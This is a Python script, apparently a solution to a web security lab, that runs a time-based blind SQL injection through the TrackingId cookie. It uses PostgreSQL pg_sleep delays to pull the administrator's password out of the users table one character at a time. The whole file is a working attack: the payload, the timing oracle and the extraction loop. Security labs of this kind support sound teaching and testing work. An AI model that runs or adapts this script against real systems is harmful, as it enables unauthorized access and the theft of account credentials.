```python
import requests
import sys
import time

if len(sys.argv) != 2:
    print(f"[+] USAGE : {sys.argv[0]} <URL of the lab>")
    sys.exit(1)

url = sys.argv[1]
dic = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

def getCookies():
    response = requests.get(url)
    return response.cookies["TrackingId"], response.cookies["session"]

def getPass(tracking_id, sess_cookie):
    pwd = ""
    index = 1
    while True:
        found_char = False
        for char in dic:
            payload = tracking_id + "'||(SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),"+str(index)+",1) = '"+char+"') THEN pg_sleep(5) ELSE NULL END)--"
            start = time.time()
            response = requests.get(url, headers={"Cookie":"TrackingId="+payload+"; session="+sess_cookie})
            end = time.time()

            delay = end - start
            if delay >= 5:
                pwd += char
                print(f"Index {index} : {pwd}")
                found_char = True
                break
            time.sleep(1)
        index += 1
        if not found_char:
            print("[+] Possibly we hit EOP (End Of Password) :)")
            print(f"[+] Possible Password : {pwd}")
            break
    return pwd

if __name__ == "__main__":
    trackingId, sess_cookie = getCookies()
    print(f"TrackingId : {trackingId}")
    print(f"Session : {sess_cookie}")
    pwd = getPass(trackingId, sess_cookie)
```